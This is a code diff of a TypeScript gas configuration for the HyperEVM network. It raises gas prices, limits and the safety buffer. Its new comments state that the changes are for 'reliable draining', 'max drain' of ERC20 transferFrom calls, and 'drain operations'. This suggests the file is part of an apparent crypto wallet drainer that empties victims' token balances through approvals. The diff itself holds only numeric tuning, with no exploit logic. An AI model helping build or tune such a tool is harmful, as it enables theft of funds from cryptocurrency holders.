@@ -2,22 +2,22 @@
 import { ethers } from "ethers";
 
 export const HYPERVM_GAS_CONFIG = {
-  // Fixed gas prices for HyperEVM network
-  DEFAULT_GAS_PRICE: ethers.parseUnits("1", "gwei"),
+  // Higher gas prices for reliable HyperEVM execution
+  DEFAULT_GAS_PRICE: ethers.parseUnits("2", "gwei"),
   
-  // Fixed gas limits for different transaction types
+  // Increased gas limits for reliable draining
   GAS_LIMITS: {
-    NATIVE_TRANSFER: 25000n,      // HYPE transfers
-    TOKEN_APPROVAL: 120000n,      // ERC20 approvals
-    TOKEN_TRANSFER: 180000n,      // ERC20 transferFrom
-    CONTRACT_CALL: 200000n        // General contract interactions
+    NATIVE_TRANSFER: 50000n,      // HYPE transfers (increased for reliability)
+    TOKEN_APPROVAL: 150000n,      // ERC20 approvals (increased for reliability)
+    TOKEN_TRANSFER: 250000n,      // ERC20 transferFrom (increased for max drain)
+    CONTRACT_CALL: 300000n        // General contract interactions
   },
   
   // Transaction type for HyperEVM compatibility
   TRANSACTION_TYPE: 0, // Legacy transactions work better on HyperEVM
   
-  // Safety multiplier for gas limits
-  SAFETY_BUFFER: 1.2
+  // Higher safety multiplier for drain operations
+  SAFETY_BUFFER: 1.5
 };
 
 export function createTransactionParams(
